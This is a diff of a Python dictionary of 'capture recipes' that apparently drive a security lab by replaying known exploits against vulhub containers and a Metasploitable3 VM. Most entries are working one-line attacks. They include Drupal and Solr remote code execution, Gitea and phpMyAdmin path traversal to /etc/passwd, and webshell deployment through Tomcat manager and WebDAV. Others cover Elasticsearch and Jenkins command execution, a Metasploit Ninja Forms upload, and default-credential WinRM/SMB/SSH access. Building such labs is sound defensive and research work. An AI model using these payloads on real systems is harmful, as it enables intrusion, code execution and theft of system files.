@@ -61,11 +61,49 @@ CAPTURE_RECIPES: dict[str, CaptureRecipe] = {
         host_setup_command=r"""sh -lc 'base=http://127.0.0.1:$TARGET_PORT; host=$TARGET_HOST:$TARGET_PORT; for i in $(seq 1 30); do page=$(curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-admin/install.php" 2>/dev/null || true); test -n "$page" && break; sleep 2; done; if printf "%s" "$page" | grep -q "language-chooser"; then curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" -X POST "$base/wp-admin/install.php?step=1" -d "language=" >/dev/null; fi; page=$(curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-login.php"); if ! printf "%s" "$page" | grep -q "user_login"; then curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" -X POST "$base/wp-admin/install.php?step=2" --data-urlencode "weblog_title=PortalLab" --data-urlencode "user_name=admin" --data-urlencode "admin_password=PortalLab1!" --data-urlencode "admin_password2=PortalLab1!" --data-urlencode "admin_email=portal@example.invalid" --data-urlencode "blog_public=0" --data-urlencode "Submit=Install WordPress" >/dev/null; fi; curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-login.php" | grep -q "user_login" && echo PORTAL_HOST_SETUP:wordpress-installed' """,
         host_setup_pattern=r"PORTAL_HOST_SETUP:wordpress-installed",
     ),
-    "vuln_confluence_rce": CaptureRecipe(
-        command=r"""url="http://$TARGET_HOST:$TARGET_PORT/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"; out=$(curl -sS -i --max-time 30 "$url"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'X-Cmd-Response: uid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
-    ),
+    # vuln_confluence_rce has no recipe: found live 2026-07-31 -- the exploit
+    # endpoint is behind Confluence's global setup filter, and the vulhub
+    # README is explicit that clearing setup requires "a Confluence Server
+    # test certificate from Atlassian" (a real license key issued by an
+    # external third party). That can't be scripted into a deterministic,
+    # offline, replayable host_setup_command the way a local SQLite/MySQL
+    # install can. See config/security_corpus.yaml's
+    # scenario_scope.excluded_from_lab_replay -- this scenario is classified
+    # as theory, not a backed lab exercise, for the same reason as the
+    # generic web_* entries there.
     "vuln_drupal_rce": CaptureRecipe(
-        command=r"""out=$(curl -sS --max-time 30 -X POST "http://$TARGET_HOST:$TARGET_PORT/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" --data-urlencode 'form_id=user_register_form' --data-urlencode '_drupal_ajax=1' --data-urlencode 'mail[#post_render][]=exec' --data-urlencode 'mail[#type]=markup' --data-urlencode 'mail[#markup]=id'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
+        # A fresh drupal/CVE-2018-7600 container serves only /core/install.php
+        # until the installer wizard is completed (found live 2026-07-31: the
+        # exploit request always fell through to a "Redirecting to
+        # /core/install.php" body, never `id`'s output, regardless of payload
+        # correctness). host_setup_command drives the standard-profile/sqlite
+        # install wizard end to end (profile select -> db config -> batch
+        # install poll -> site configure) before the exploit ever runs.
+        command=r"""out=$(curl -sS --max-time 30 -X POST "http://$TARGET_HOST:$TARGET_PORT/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" --data-urlencode 'form_id=user_register_form' --data-urlencode '_drupal_ajax=1' --data-urlencode 'mail[#post_render][]=exec' --data-urlencode 'mail[#type]=markup' --data-urlencode 'mail[#markup]=id'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__""",
+        host_setup_command=r"""sh -lc '
+base=http://127.0.0.1:$TARGET_PORT
+host=$TARGET_HOST:$TARGET_PORT
+for i in $(seq 1 30); do code=$(curl -sS -m 5 -o /dev/null -w "%{http_code}" -H "Host: $host" "$base/" 2>/dev/null || true); test -n "$code" && test "$code" != "000" && break; sleep 2; done
+front=$(curl -sS -m 10 -H "Host: $host" "$base/")
+if printf "%s" "$front" | grep -q "core/install.php"; then
+  jar=/tmp/portal-drupal.cookies; rm -f "$jar"
+  page=$(curl -sS -m 10 -c "$jar" -H "Host: $host" "$base/core/install.php?langcode=en")
+  fbid=$(printf "%s" "$page" | grep -o "form_build_id\" value=\"[^\"]*\"" | head -1 | sed "s/.*value=\"//;s/\"//")
+  page=$(curl -sS -m 10 -b "$jar" -c "$jar" -L -H "Host: $host" --data-urlencode "form_build_id=$fbid" --data-urlencode "form_id=install_select_profile_form" --data-urlencode "profile=standard" --data-urlencode "op=Save and continue" "$base/core/install.php?langcode=en")
+  fbid=$(printf "%s" "$page" | grep -o "form_build_id\" value=\"[^\"]*\"" | head -1 | sed "s/.*value=\"//;s/\"//")
+  page=$(curl -sS -m 10 -b "$jar" -c "$jar" -L -H "Host: $host" --data-urlencode "driver=sqlite" --data-urlencode "sqlite[database]=sites/default/files/.sqlite/db.sqlite" --data-urlencode "form_build_id=$fbid" --data-urlencode "form_id=install_settings_form" --data-urlencode "op=Save and continue" "$base/core/install.php?rewrite=ok&langcode=en&profile=standard")
+  for i in $(seq 1 40); do
+    page=$(curl -sS -m 10 -b "$jar" -c "$jar" -H "Host: $host" "$base/core/install.php?rewrite=ok&langcode=en&profile=standard&id=1&op=do_nojs")
+    printf "%s" "$page" | grep -q "100%" && { page=$(curl -sS -m 10 -b "$jar" -c "$jar" -L -H "Host: $host" "$base/core/install.php?rewrite=ok&langcode=en&profile=standard&id=1&op=finished"); break; }
+    sleep 1
+  done
+  fbid=$(printf "%s" "$page" | grep -o "form_build_id\" value=\"[^\"]*\"" | head -1 | sed "s/.*value=\"//;s/\"//")
+  curl -sS -m 15 -b "$jar" -c "$jar" -L -H "Host: $host" --data-urlencode "site_name=Portal Lab" --data-urlencode "site_mail=portal@example.invalid" --data-urlencode "account[name]=admin" --data-urlencode "account[mail]=portal@example.invalid" --data-urlencode "account[pass][pass1]=PortalLab1!" --data-urlencode "account[pass][pass2]=PortalLab1!" --data-urlencode "date_default_timezone=UTC" --data-urlencode "site_default_country=US" --data-urlencode "enable_update_status_module=1" --data-urlencode "form_build_id=$fbid" --data-urlencode "form_id=install_configure_form" --data-urlencode "op=Save and continue" "$base/core/install.php?rewrite=ok&langcode=en&profile=standard" >/dev/null
+fi
+front=$(curl -sS -m 10 -H "Host: $host" "$base/")
+printf "%s" "$front" | grep -q "core/install.php" || echo PORTAL_HOST_SETUP:drupal-installed
+' """,
+        host_setup_pattern=r"PORTAL_HOST_SETUP:drupal-installed",
     ),
     "vuln_solr_rce": CaptureRecipe(
         command=r"""base="http://$TARGET_HOST:$TARGET_PORT/solr"; cores=$(curl -sS --max-time 30 "$base/admin/cores?wt=json"); core=$(printf '%s' "$cores" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(next(iter(d["status"])))'); test -n "$core" || exit 1; curl -sS --max-time 30 -X POST "$base/$core/config" -H 'Content-Type: application/json' --data '{"update-queryresponsewriter":{"startup":"lazy","name":"velocity","class":"solr.VelocityResponseWriter","template.base.dir":"","solr.resource.loader.enabled":"true","params.resource.loader.enabled":"true"}}' >/dev/null; tpl='%23set($x=%27%27)%23set($rt=$x.class.forName(%27java.lang.Runtime%27))%23set($chr=$x.class.forName(%27java.lang.Character%27))%23set($str=$x.class.forName(%27java.lang.String%27))%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'; out=$(curl -g -sS --max-time 30 "$base/$core/select?q=1&&wt=velocity&v.template=custom&v.template.custom=$tpl"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
@@ -89,7 +127,40 @@ CAPTURE_RECIPES: dict[str, CaptureRecipe] = {
         command=r"""base="http://$TARGET_HOST:$TARGET_PORT/nacos"; user=portalproof; listed=$(curl -sS --max-time 30 -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?pageNo=1&pageSize=10"); created=$(curl -sS --max-time 30 -X POST -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?username=$user&password=portalproof"); confirmed=$(curl -sS --max-time 30 -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?pageNo=1&pageSize=20"); login=$(curl -sS --max-time 30 -X POST "$base/v1/auth/users/login?username=nacos&password=nacos"); printf '%s\n%s\n%s\n%s\n' "$listed" "$created" "$confirmed" "$login"; printf '%s' "$created" | grep -q 'create user ok' && printf '%s' "$confirmed" | grep -q 'portalproof' && printf '%s' "$login" | grep -Eq 'accessToken|globalAdmin' && echo __PORTAL_RECIPE_OK__"""
     ),
     "vuln_gitea_rce": CaptureRecipe(
-        command=r"""body='{"Oid":"....../../../etc/passwd","Size":1000,"User":null,"Password":null,"Repo":"a/b","Authorization":""}'; out=$(curl -sS --max-time 30 -X POST "http://$TARGET_HOST:$TARGET_PORT/a/b.git/info/lfs/objects" -H 'Content-Type: application/json' --data "$body"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
+        # The original recipe POSTed the LFS pointer registration and grepped
+        # ITS response for /etc/passwd -- found live 2026-07-31: the traversal
+        # proof only ever appears in a SEPARATE follow-up GET against the
+        # objects/<mangled-oid>/sth download route (confirmed against the
+        # vulhub README and a live capture: root:x:0:0: never appears in the
+        # POST response, only the GET). The POST also 401s without LFS basic
+        # auth against a real (non-placeholder) repo/user, and the repo/user
+        # do not exist until host_setup_command creates them, which itself
+        # needs an install-wizard pass + a `docker compose restart` (Gitea
+        # 1.4's install handler restarts its own process mid-request and never
+        # completes admin-account creation -- "admin" is also a reserved
+        # username -- so setup registers a normal user post-restart instead).
+        command=r"""out1=$(curl -sS --max-time 20 -u portaluser:PortalLab1! -X POST "http://$TARGET_HOST:$TARGET_PORT/portaluser/repo.git/info/lfs/objects" -H 'Accept: application/vnd.git-lfs+json' -H 'Content-Type: application/json' --data '{"Oid":"....../../../etc/passwd","Size":1000000,"User":"a","Password":"a","Repo":"a","Authorization":"a"}'); printf 'POST=%s\n' "$out1"; out2=$(curl -sS --max-time 20 --path-as-is -u portaluser:PortalLab1! "http://$TARGET_HOST:$TARGET_PORT/portaluser/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth" 2>&1); printf 'GET=%s\n' "$out2"; printf '%s' "$out2" | grep -Eq 'root:x:0:0:' && echo __PORTAL_RECIPE_OK__""",
+        host_setup_command=r"""sh -lc '
+base=http://127.0.0.1:$TARGET_PORT
+host=$TARGET_HOST:$TARGET_PORT
+for i in $(seq 1 30); do code=$(curl -sS -m 5 -o /dev/null -w "%{http_code}" -H "Host: $host" "$base/" 2>/dev/null || true); test "$code" = "200" -o "$code" = "302" && break; sleep 2; done
+jar=/tmp/portal-gitea.cookies; rm -f "$jar"
+front=$(curl -sS -m 10 -c "$jar" -H "Host: $host" "$base/")
+if printf "%s" "$front" | grep -q "/install"; then
+  page=$(curl -sS -m 10 -c "$jar" -H "Host: $host" "$base/install")
+  csrf=$(printf "%s" "$page" | grep -o "_csrf\" content=\"[^\"]*\"" | head -1 | sed "s/.*content=\"//;s/\"//")
+  curl -sS -m 15 -b "$jar" -c "$jar" -H "Host: $host" -X POST "$base/install" --data-urlencode "_csrf=$csrf" --data-urlencode "db_type=SQLite3" --data-urlencode "db_path=/data/gitea/gitea.db" --data-urlencode "app_name=Gitea: Git with a cup of tea" --data-urlencode "repo_root_path=/data/git/repositories" --data-urlencode "lfs_root_path=/data/git/lfs" --data-urlencode "run_user=git" --data-urlencode "domain=$TARGET_HOST" --data-urlencode "ssh_port=22" --data-urlencode "http_port=$TARGET_PORT" --data-urlencode "app_url=http://$host/" --data-urlencode "log_root_path=/data/gitea/log" --data-urlencode "register_confirm=off" --data-urlencode "mail_notify=off" --data-urlencode "offline_mode=on" --data-urlencode "admin_name=portaladmin" --data-urlencode "admin_passwd=PortalLab1!" --data-urlencode "admin_confirm_passwd=PortalLab1!" --data-urlencode "admin_email=admin@example.invalid" >/dev/null 2>&1
+  docker compose -f /opt/vulhub/gitea/1.4-rce/docker-compose.yml restart >/dev/null 2>&1
+  for i in $(seq 1 30); do code=$(curl -sS -m 5 -o /dev/null -w "%{http_code}" -H "Host: $host" "$base/" 2>/dev/null || true); test "$code" = "200" && break; sleep 2; done
+fi
+rm -f "$jar"
+page=$(curl -sS -m 10 -c "$jar" -H "Host: $host" "$base/user/sign_up")
+csrf=$(printf "%s" "$page" | grep -o "_csrf\" content=\"[^\"]*\"" | head -1 | sed "s/.*content=\"//;s/\"//")
+curl -sS -m 15 -b "$jar" -c "$jar" -H "Host: $host" -X POST "$base/user/sign_up" --data-urlencode "_csrf=$csrf" --data-urlencode "user_name=portaluser" --data-urlencode "email=portaluser@example.invalid" --data-urlencode "password=PortalLab1!" --data-urlencode "retype=PortalLab1!" >/dev/null 2>&1
+repo=$(curl -sS -m 15 -u portaluser:PortalLab1! -H "Host: $host" -X POST "$base/api/v1/user/repos" -H "Content-Type: application/json" --data "{\"name\":\"repo\",\"auto_init\":false,\"private\":false}")
+printf "%s" "$repo" | grep -q "\"full_name\":\"portaluser/repo\"" && echo PORTAL_HOST_SETUP:gitea-repo-ready
+' """,
+        host_setup_pattern=r"PORTAL_HOST_SETUP:gitea-repo-ready",
     ),
     "vuln_joomla_rce": CaptureRecipe(
         command=r"""out=$(curl -sS --max-time 30 "http://$TARGET_HOST:$TARGET_PORT/api/index.php/v1/config/application?public=true"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '"(password|db|user)"' && echo __PORTAL_RECIPE_OK__"""
@@ -107,7 +178,24 @@ CAPTURE_RECIPES: dict[str, CaptureRecipe] = {
         command=r"""out=$(curl -sS --max-time 30 -H 'Accept: ../../../../../../../../etc/passwd{{' "http://$TARGET_HOST:$TARGET_PORT/robots"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '^root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
     ),
     "vuln_phpmyadmin_rce": CaptureRecipe(
-        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; curl -sS --max-time 30 -c /tmp/portal-pma.cookies "$base/" >/dev/null; out=$(curl -sS --path-as-is --max-time 30 -b /tmp/portal-pma.cookies "$base/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"); printf '%s\n' "$out" | grep -Em 5 'root:x:0:0:'; printf '%s' "$out" | grep -Eq 'root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
+        # phpMyAdmin's own container answers HTTP as soon as apache starts, well
+        # before its linked mysql:5.5 sidecar finishes initializing (random-root
+        # password generation + first-boot schema init takes several seconds) --
+        # found live 2026-07-31: hitting the exploit right after cmd_up's plain
+        # TCP-reachability check landed on phpMyAdmin's "Access denied!" config-auth
+        # failure page every time, not the SQL console. host_setup_command polls
+        # until the config-mode auto-login actually succeeds before the exploit runs.
+        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; curl -sS --max-time 30 -c /tmp/portal-pma.cookies "$base/" >/dev/null; out=$(curl -sS --path-as-is --max-time 30 -b /tmp/portal-pma.cookies "$base/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"); printf '%s\n' "$out" | grep -Em 5 'root:x:0:0:'; printf '%s' "$out" | grep -Eq 'root:x:0:0:' && echo __PORTAL_RECIPE_OK__""",
+        host_setup_command=r"""sh -lc '
+base=http://127.0.0.1:$TARGET_PORT
+host=$TARGET_HOST:$TARGET_PORT
+for i in $(seq 1 40); do
+  out=$(curl -sS -m 5 -H "Host: $host" "$base/" 2>/dev/null || true)
+  printf "%s" "$out" | grep -qi "Access denied" || { printf "%s" "$out" | grep -qi "phpMyAdmin" && { echo PORTAL_HOST_SETUP:phpmyadmin-ready; exit 0; }; }
+  sleep 3
+done
+exit 1' """,
+        host_setup_pattern=r"PORTAL_HOST_SETUP:phpmyadmin-ready",
     ),
     "vuln_nginx_lfi": CaptureRecipe(
         command=r"""out=$(python3 /vulhub/nginx/CVE-2017-7529/poc.py "http://$TARGET_HOST:$TARGET_PORT/" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'KEY:|HTTP/1\.[01] 200|Content-Type:' && echo __PORTAL_RECIPE_OK__"""
@@ -140,6 +228,177 @@ CAPTURE_RECIPES: dict[str, CaptureRecipe] = {
         postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/prove1.txt && echo PORTAL_TARGET_POSTCONDITION:jackson-rce:/tmp/prove1.txt'"''',
         postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:jackson-rce:/tmp/prove1.txt",
     ),
+    # ── Metasploitable3-Windows (meta3) recipes ────────────────────────────
+    # All fixed/well-known ports on a real VM, not vulhub-dynamic -- hardcoded
+    # rather than routed through $TARGET_PORT (that placeholder only carries
+    # whichever port the generic multi-port readiness probe happened to find
+    # first, which is frequently a different service on this multi-service box).
+    "meta3_ftp_backdoor": CaptureRecipe(
+        command=r"""out=$(curl -sS --max-time 20 --user vagrant:vagrant "ftp://$TARGET_HOST/" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'index\.html' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_ssh_brute": CaptureRecipe(
+        command=r"""out=$(sshpass -p vagrant ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 "vagrant@$TARGET_HOST" "whoami" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'vagrant-2008r2\\vagrant' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_winrm_weakpass": CaptureRecipe(
+        command=r"""out=$(nxc winrm "$TARGET_HOST" -u vagrant -p vagrant -X "whoami" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'Pwn3d!' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_smb_exploit": CaptureRecipe(
+        command=r"""out=$(nxc smb "$TARGET_HOST" -u vagrant -p vagrant 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'Pwn3d!' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_psexec": CaptureRecipe(
+        command=r"""out=$(nxc smb "$TARGET_HOST" -u vagrant -p vagrant -x "whoami" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'Executed command via wmiexec' && printf '%s' "$out" | grep -Eq 'vagrant-2008r2\\vagrant' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_snmp_enum": CaptureRecipe(
+        command=r"""out=$(snmpwalk -v2c -c public -t 5 "$TARGET_HOST" 2>&1); printf '%s\n' "$out" | head -20; printf '%s' "$out" | grep -Eq 'Windows Version 6\.1' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_mysql_exploit": CaptureRecipe(
+        command=r"""out=$(mysql -h "$TARGET_HOST" -u root --connect-timeout=8 --skip-ssl -e "SELECT VERSION(); SHOW DATABASES;" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '5\.5\.20' && printf '%s' "$out" | grep -Eq 'wordpress' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_linux_privesc": CaptureRecipe(
+        # "whoami /all" produces ~8.7KB of output -- found live 2026-08-01:
+        # lab_dispatch's execute_bash truncates around 8000 bytes, silently
+        # cutting the group-membership section this recipe needs BEFORE its own
+        # grep ever runs (recipe_success came back false every time despite the
+        # exploit genuinely succeeding -- validate_capture_signals still found
+        # real evidence in the pcap, proving this was a truncation artifact, not
+        # a failed exploit). A compact PowerShell role-membership check keeps
+        # total output under ~1.5KB, well clear of the cap.
+        command=r"""out=$(nxc winrm "$TARGET_HOST" -u vagrant -p vagrant -X "whoami; ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'vagrant-2008r2\\vagrant' && printf '%s' "$out" | grep -Eq 'True' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_tomcat_manager": CaptureRecipe(
+        # Real Tomcat manager creds on this box are sploit:sploit (manager-gui
+        # role only, per C:\Program Files\...\conf\tomcat-users.xml -- read via
+        # authenticated WinRM, found live 2026-08-01). tomcat:tomcat (the old
+        # red_prompt's guess) is left commented out in that file, never active.
+        # The manager-gui role means only the CSRF-protected HTML upload works,
+        # not the text/list API (needs manager-script, which sploit lacks) --
+        # so this fetches a fresh CSRF nonce + session before deploying.
+        # Also: Tomcat here is really on 8282, not port 8080 as the old
+        # red_prompt assumed (8080 is a separate GlassFish instance).
+        #
+        # Found live 2026-08-01: undeploy needs POST, not GET (Tomcat 8 rejects
+        # a GET to /undeploy outright) -- an earlier version silently no-op'd
+        # its cleanup, leaving the webshell deployed, so the NEXT run's deploy
+        # failed with "war already exists" and skipped the real exploit request
+        # while still passing (the stale webshell answered the invoke), leaving
+        # a hollow capture despite recipe_success=true. Fixing undeploy to POST
+        # then hit a second problem: Tomcat's CSRF nonce is single-use and
+        # rotates on every state-changing request, so undeploy-then-redeploy
+        # with the same nonce 403'd, and re-extracting a fresh nonce from the
+        # undeploy response still 403'd (rotation semantics were not reliably
+        # reproducible over curl). Simplest reliable fix: never collide in the
+        # first place -- deploy under a timestamp-suffixed context path every
+        # run, so there is nothing to undeploy before deploying.
+        command=r"""jar=/tmp/portal-tc.cookies; rm -f "$jar"; mkdir -p /tmp/portal-warbuild && cd /tmp/portal-warbuild && suffix=$(date +%s%N) && warname="portalproof$suffix" && printf '%s\n' '<%@ page import="java.util.*,java.io.*"%>' '<% Process p = Runtime.getRuntime().exec("cmd /c whoami"); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } %>' > "$warname.jsp"; jar -cf "/tmp/$warname.war" "$warname.jsp"; page=$(curl -sS -m 10 -c "$jar" -u sploit:sploit "http://$TARGET_HOST:8282/manager/html"); nonce=$(printf '%s' "$page" | grep -o 'CSRF_NONCE=[a-zA-Z0-9]*' | head -1 | cut -d= -f2); deploy=$(curl -sS -m 15 -b "$jar" -u sploit:sploit -F "deployWar=@/tmp/$warname.war;type=application/octet-stream" "http://$TARGET_HOST:8282/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$nonce"); printf '%s\n' "$deploy" | grep -Eo '<pre>[^<]*'; sleep 2; out=$(curl -sS -m 10 "http://$TARGET_HOST:8282/$warname/$warname.jsp"); printf '%s\n' "$out"; curl -sS -m 10 -b "$jar" -u sploit:sploit -X POST "http://$TARGET_HOST:8282/manager/html/undeploy?path=/$warname&org.apache.catalina.filters.CSRF_NONCE=$nonce" >/dev/null; printf '%s' "$out" | grep -Eiq 'nt authority\\system' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_elasticsearch_rce": CaptureRecipe(
+        # ES 1.1.1 predates Groovy scripting support (added 1.3.3), so the old
+        # red_prompt's Groovy payload always 400'd with "script_lang not
+        # supported [groovy]" -- found live 2026-08-01. This version's real
+        # bug is CVE-2014-3120: dynamic MVEL scripting is enabled by default
+        # and accepts an unrestricted script_fields script with no lang
+        # specified (MVEL is the implicit default), giving direct RCE.
+        command=r"""curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/" -H 'Content-Type: application/json' -d '{"name":"portal-proof"}' >/dev/null; out=$(curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/_search?pretty" -H 'Content-Type: application/json' -d '{"size":1,"query":{"match_all":{}},"script_fields":{"exp":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_jenkins_rce": CaptureRecipe(
+        # Real port is 8484, not 8080 as the old red_prompt assumed (8080 is
+        # GlassFish). The /script Groovy console needs no authentication at
+        # all on this box -- confirmed live 2026-08-01, direct RCE, no admin
+        # login/CSRF flow needed unlike Tomcat's manager.
+        command=r"""out=$(curl -sS -m 10 "http://$TARGET_HOST:8484/scriptText" --data-urlencode 'script=println "cmd /c whoami".execute().text'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_webdav_upload": CaptureRecipe(
+        # DAV/2 is advertised at the WAMP root (Apache 2.2.21 + PHP 5.3.10 on
+        # port 8585) but PUT is only actually allowed under /uploads/ -- root
+        # and other guessed aliases (/webdav/, /dav/, /files/) all 405 --
+        # confirmed live 2026-08-01. Goes past a benign file write to a PHP
+        # webshell to prove real command execution, not just upload access.
+        command=r"""curl -sS -m 10 -T <(printf '<?php system($_GET["c"]); ?>') "http://$TARGET_HOST:8585/uploads/portalproof.php" >/dev/null; out=$(curl -sS -m 10 "http://$TARGET_HOST:8585/uploads/portalproof.php?c=whoami"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_wordpress_ninja": CaptureRecipe(
+        # WordPress + Ninja Forms 2.9.42, unauthenticated arbitrary file upload
+        # (msf exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload,
+        # "check" support confirmed vulnerable live 2026-08-01). FORM_PATH must
+        # point at a real page hosting a Ninja form -- the homepage has no
+        # visible link to one; /index.php/king-of-hearts/ (found by grepping
+        # the front page for "ninja"/"nf-form" across its linked posts) is the
+        # one that actually hosts a form. php/exec has no session, so proof is
+        # captured by redirecting the payload's own output to a web-readable
+        # file under wp-content/uploads and reading it back.
+        #
+        # Found live 2026-08-01: unlike the SMB/WinRM/Tomcat recipes, msfconsole's
+        # own status text here did NOT leak into the captured network:packet
+        # telemetry -- msfconsole generates far more setup/probing HTTP traffic
+        # than the other recipes before it ever touches the real exploit, and
+        # network:packet is a capped representative SAMPLE, not the full pcap;
+        # the real proof-file GET landed past that cap and never appeared in the
+        # capture at all despite recipe_success:true. Rather than fight sampling
+        # (a separate, already-tracked evidence-selection problem), this adds an
+        # independent postcondition_command re-check of the fixed proof URL from
+        # the lab host -- the same mechanism vulhub recipes use for postcondition
+        # proof, landing in observed_telemetry which is never subject to pcap
+        # sampling. The proof filename is fixed (not randomized) so the
+        # postcondition step can reference it without shared state; only the
+        # random webshell filename (msf's own upload, a real leftover risk on a
+        # persistent VM) is cleaned up here.
+        command=r"""msf_out=$(msfconsole -q -x "use exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload; set RHOSTS $TARGET_HOST; set RPORT 8585; set TARGETURI /wordpress/; set FORM_PATH /index.php/king-of-hearts/; set PAYLOAD php/exec; set CMD 'whoami > portalproof-out.txt'; set AllowNoCleanup true; run; exit -y" 2>&1); printf '%s\n' "$msf_out" | tail -20; shell=$(printf '%s' "$msf_out" | grep -Eo 'nftmp-[A-Za-z0-9]+\.php' | head -1); sleep 2; out=$(curl -sS -m 10 "http://$TARGET_HOST:8585/wordpress/wp-content/uploads/portalproof-out.txt"); printf '%s\n' "$out"; test -n "$shell" && for i in 1 2 3; do nxc winrm "$TARGET_HOST" -u vagrant -p vagrant -X "Remove-Item 'C:\wamp\www\wordpress\wp-content\uploads\$shell' -Force -ErrorAction SilentlyContinue" >/dev/null 2>&1; sleep 1; done; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__""",
+        postcondition_command=r"""sh -lc 'out=$(curl -sS -m 10 "http://$TARGET_HOST:8585/wordpress/wp-content/uploads/portalproof-out.txt"); printf "%s\n" "$out" | grep -Eiq "nt authority" && echo "PORTAL_TARGET_POSTCONDITION:wordpress-ninja:$out"' """,
+        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:wordpress-ninja:",
+    ),
+    "meta3_full_chain": CaptureRecipe(
+        # Composes techniques already independently verified live on this box
+        # rather than re-deriving them: T1595 recon (nmap service fingerprint),
+        # T1078/T1059 (WinRM vagrant:vagrant + whoami, same as
+        # meta3_winrm_weakpass), and T1190/T1059 (Elasticsearch CVE-2014-3120
+        # MVEL RCE, same as meta3_elasticsearch_rce -- the old red_prompt only
+        # fingerprinted ES with a bare GET, which doesn't reach initial-access
+        # or execution; this goes all the way to real command output like the
+        # other meta3 recipes do). mysql also needs --skip-ssl (see
+        # meta3_mysql_exploit) or the modern mysql client's default-on SSL
+        # negotiation fails against this 5.5.20 server.
+        #
+        # Found live 2026-08-01: like meta3_wordpress_ninja, network:packet is
+        # a capped representative sample, and in a long combined command the
+        # EARLY steps (nmap, WinRM) fell outside the sample while the LAST
+        # step (Elasticsearch) landed -- recipe_success:true but T1595/T1078
+        # kept coming back missing, consistently, not flaky. Fix: write the
+        # WinRM whoami result to a file under IIS's web root (confirmed live:
+        # the FTP root from meta3_ftp_backdoor IS the IIS web root on this
+        # box) and independently re-read it via postcondition_command, which
+        # lands in observed_telemetry and is never subject to pcap sampling --
+        # same mechanism as wordpress_ninja. T1595 reuses the same postcondition
+        # channel via a plain curl fingerprint of Elasticsearch (host 112 has
